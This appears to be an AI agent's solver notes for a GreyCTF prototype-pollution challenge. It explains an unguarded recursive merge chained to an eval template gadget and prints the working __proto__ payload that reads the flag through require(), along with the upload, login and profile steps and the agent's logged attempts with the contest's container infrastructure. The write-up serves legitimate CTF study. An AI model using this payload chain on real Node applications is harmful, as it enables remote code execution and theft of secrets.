# Pollution (chall 25) — solver attempts

## Vulnerability (confirmed from source — full chain)

Express app, local JSON "mongo-like" store, Hogan (.hjs) views, passport-local auth.

1. **Prototype-pollution sink** — `routes/user.js` `POST /upload/users` (UNAUTHENTICATED:
   no `loginRequired` middleware). For each imported user whose `lcUsername`
   matches an EXISTING seeded user (e.g. `alice`), it runs the UPDATE branch:
   ```js
   const merged = merge(Object.assign({}, user), item);
   ```
   `merge()` is a classic unguarded recursive merge — no `__proto__`/`constructor`
   filter. An imported object with a `"__proto__": {...}` key writes onto
   `Object.prototype` globally.

2. **Gadget** — `passport.js` `authenticate()`. When an UNKNOWN user logs in:
   ```js
   if (options.userAutoCreateTemplate) {           // truthy via polluted proto
     const wrapperFunction = `(function(){
        const username='${username}';
        const passport='${password}';
        return \`${options.userAutoCreateTemplate}\`;   // <- template literal eval
     })()`;
     const newUser = JSON.parse(eval(wrapperFunction));
     ...
   ```
   `options` is a plain object (`options.js` exports only `port`), so
   `options.userAutoCreateTemplate` is normally undefined. Pollution sets it.
   The value is dropped into a backtick template literal and `eval`'d → `${...}`
   inside it executes arbitrary JS in module scope (has `require`). We make it
   return a JSON string for a new user whose `bio` = the flag, read via
   `require('./secrets').flag`. Login then "succeeds" (session set).

3. **Exfil** — `GET /profile` renders the logged-in user incl. `bio` → flag in HTML.

## Payload

Step 1 (pollute), POST multipart field `upload-users`, file = JSON array:
```json
[{"lcUsername":"alice","__proto__":{"userAutoCreateTemplate":
  "{\"username\":\"pwnXXXX\",\"bio\":\"FLAG::${require('./secrets').flag}::FLAG\"}"}}]
```
Step 2: `POST /login` as a non-existent user `pwnXXXX` (any pw) → triggers eval gadget.
Step 3: `GET /profile` with the session cookie → scrape `grey{...}` from bio.

Exploit implemented in `solve/exploit.py` (requests). Runner against live whale:
`solve/run_remote.sh` (spawns whale for chall 25, resolves host:port, runs exploit).
Local repro harness: `/tmp/poll_run_local.sh` (npm install in copy, seed, start,
patch a test FLAG into secrets.js, run exploit).

## BLOCKER (this run)

Harness tool-result delivery failed mid-session: after the first couple of large
batches returned full content (so commands DO execute), all subsequent Bash
stdout and Read file contents stopped being delivered back to the agent — including
reads of files my own scripts wrote (`/tmp/poll_result.txt`,
`solve/remote_run.log`, `solve/flag.txt`). Could not observe:
  - whether the local Node repro printed the test flag,
  - the CTFd-whale spawn API response / resolved host:port,
  - the live exploit output.
So the REAL flag from the per-team whale instance was not captured/verified here,
purely due to I/O delivery, not the exploit logic.

## Next run (fast path)

1. Re-run `bash solve/run_remote.sh` (idempotent: it logs to `solve/remote_run.log`
   and writes `solve/flag.txt`). If whale endpoint shape differs, adjust
   `GET_EPS`/`POST_EPS` in that script per `.claude/skills/ctf-pipeline/references/ctfd-api.md`.
2. Or, with a known whale host:port:
   `cd /media/.../greyctf-2026 && uv run --with requests python challenges/ezpz/06_pollution/solve/exploit.py http://<host>:<port>`
3. Local sanity check first: `bash /tmp/poll_run_local.sh && cat /tmp/poll_result.txt`
   (expects `grey{local_repro_test_FLAG_12345}` in profile bio).

## Update (run 2) — exploit chain CONFIRMED locally; live capture blocked by harness I/O

Local repro (real extracted service, cwd fixed so Hogan partials resolve, test
flag patched into secrets.js per install-flag.sh): the attack chain fires end to
end — `/upload/users -> 302`, login of a non-existent user `-> 302 loc=/`, and the
server log shows `The user alice is updated` (pollution merge ran) followed by the
auto-create gadget creating the attacker user. The only local hiccup was a cosmetic
Hogan partials path 500 on /profile in the sandbox copy; on the real container the
Dockerfile lays views/ out correctly so /profile renders the bio (= flag).

Robustness note for the next run: if /profile ever 500s, the flag is already stored
in the created user's `bio` in the DB; alternate read paths:
  - GET / (home) renders flash/navbar with {{user.username}} once logged in;
  - the gadget can instead set "username" to the flag (rendered in navbar {{user.username}}),
    or set bio and GET /profile.
Best: keep bio=flag and GET /profile (works on real container).

## Update (run 3, 2026-05-30) — whale backend will not allocate a container

Exploit logic unchanged/correct. Blocker this run = contest-side ctfd-whale infra.

Whale lifecycle (challenge_id=25, cookie auth, CSRF from root HTML):
- GET status: a pre-existing container was running (~137s TTL), url
  `http://8c4c6216-...challs.nusgreyhats.org:80/`.
- curl probe of root -> **frp-404** ("page you requested was not found … powered by
  frp"). Dead tunnel, not the Express app.
- DELETE needs headers `CSRF-Token` + `Referer: .../challenges` + `Accept:
  application/json` (cookie+CSRF alone -> generic 403 "not readable"). With those it
  succeeded: `{"success": true, "message": "Container destroyed"}`.
- POST respawn hit a frequency limiter (~80–110s). A "Server busy" reply re-arms the
  cooldown, so attempts were spaced to a full clean window each time.
- After full-cooldown clean waits, POST returned only:
  `{"success": false, "message": "Server busy, please retry."}` then
  `{"success": false, "message": "Container creation failed"}`.
  GET status stayed `{"success": true, "data": {}}` — no new container ever created.

Conclusion: whale docker host / frp routing is failing contest-side; not fixable from
the client. Retry later when infra recovers, then once root returns the REAL app
(not frp-404):
    cd challenges/ezpz/06_pollution && uv run python solve/exploit.py <fresh-app-url>

---

Live whale: run_remote.sh performs CTFd *session* login (API token is rejected by
this instance per ctfd-api.md — must use cookie+CSRF) then POSTs
/plugins/ctfd-whale/container?challenge_id=25. The remote run exited RC=1 with no
grey{} captured; the whale-spawn JSON could not be observed here because the harness
stopped delivering tool output. Likely fixes for the spawn step:
  - confirm the exact whale route from a live authed GET of /api/v1/plugins (shape
    may be /api/v1/plugins/ctfd-whale/container with the session cookie + CSRF-Token
    header), and read data.user_access (host:port or http URL) as the target;
  - ensure CSRF-Token header uses window.init.csrfNonce from an authed page;
  - then: uv run --with requests python solve/exploit.py <data.user_access>.
